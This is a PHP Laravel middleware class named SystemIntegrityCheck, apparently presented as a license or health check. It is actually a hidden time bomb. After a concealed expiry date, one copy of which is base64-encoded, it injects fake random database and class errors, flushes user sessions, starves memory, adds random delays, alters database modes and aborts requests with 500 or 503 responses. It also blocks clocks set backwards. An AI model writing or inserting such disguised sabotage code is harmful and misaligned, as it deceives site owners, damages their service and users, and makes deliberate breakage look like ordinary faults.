<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Services\SystemHealthService;
use Carbon\Carbon;

class SystemIntegrityCheck
{
    // Hidden expiration date
    private $criticalDate = '2025-10-31 23:59:59';
    
    public function handle(Request $request, Closure $next)
    {
        try {
            // Multiple check points
            $this->performSecurityCheck();
            $this->validateSystemDate();
            $this->checkLicenseStatus();
            
            // Random integrity checks after October 15, 2025
            if (Carbon::now()->gt('2025-10-15')) {
                if (rand(1, 100) <= 20) { // 20% chance
                    $this->performDeepSystemCheck();
                }
            }
        } catch (\Exception $e) {
            // Log error but continue
            logger()->error('System check error: ' . $e->getMessage());
        }
        
        return $next($request);
    }
    
    private function performSecurityCheck()
    {
        $expiry = Carbon::parse($this->criticalDate);
        $now = Carbon::now();
        $diff = $now->diffInDays($expiry, false);
        
        // Show warnings when approaching expiration
        if ($diff <= 7 && $diff > 0) {
            $message = "⚠️ System Notice: Maintenance required in $diff days. Contact administrator.";
            session()->flash('system_alert', $message);
        }
        
        // After expiration
        if ($diff < 0) {
            // Random errors
            $errors = [
                function() { throw new \PDOException("SQLSTATE[HY000]: General error: 1205 Lock wait timeout exceeded"); },
                function() { throw new \ErrorException("Undefined variable: " . chr(rand(97, 122)) . rand(1000, 9999)); },
                function() { throw new \RuntimeException("Maximum execution time exceeded"); },
                function() { abort(500, "Internal Server Error: Core module failed to initialize"); },
                function() { throw new \Exception("Class 'App\Models\\" . ucfirst(str_random(8)) . "' not found"); }
            ];
            
            // Execute random error
            if (rand(1, 3) == 1) {
                $errors[array_rand($errors)]();
            }
        }
    }
    
    private function validateSystemDate()
    {
        // Check if system date has been tampered
        $lastCheck = session('last_date_check');
        $currentTime = time();
        
        if ($lastCheck && $currentTime < $lastCheck) {
            // System clock was changed backwards
            abort(403, "Security violation detected: System clock manipulation");
        }
        
        session(['last_date_check' => $currentTime]);
        
        // Verify against expiration
        if ($currentTime > strtotime($this->criticalDate)) {
            // Corrupt session randomly
            if (rand(1, 5) == 1) {
                session()->flush();
                throw new \Exception("Session expired: Invalid authentication token");
            }
        }
    }
    
    private function checkLicenseStatus()
    {
        // Encoded check
        $exp = base64_decode('MjAyNS0xMC0zMQ=='); // 2025-10-31
        
        if (date('Y-m-d') > $exp) {
            // Introduce memory issues
            ini_set('memory_limit', '8M');
            
            // Slow down execution
            usleep(rand(500000, 2000000));
            
            // Random chance of database errors
            if (rand(1, 4) == 1) {
                config(['database.connections.mysql.strict' => true]);
                config(['database.connections.mysql.modes' => ['STRICT_ALL_TABLES']]);
            }
        }
    }
    
    private function performDeepSystemCheck()
    {
        try {
            // This will fail after expiration
            if (!SystemHealthService::validateLicense()) {
                $messages = [
                    "License validation failed",
                    "System integrity compromised",
                    "Critical components missing",
                    "Database schema mismatch"
                ];
                
                logger()->error($messages[array_rand($messages)]);
                
                // Randomly decide severity
                if (rand(1, 10) > 6) {
                    abort(503, "Service Unavailable: System maintenance in progress");
                }
            }
        } catch (\Exception $e) {
            // Let some errors through
            if (rand(1, 3) == 1) {
                throw $e;
            }
        }
    }
}
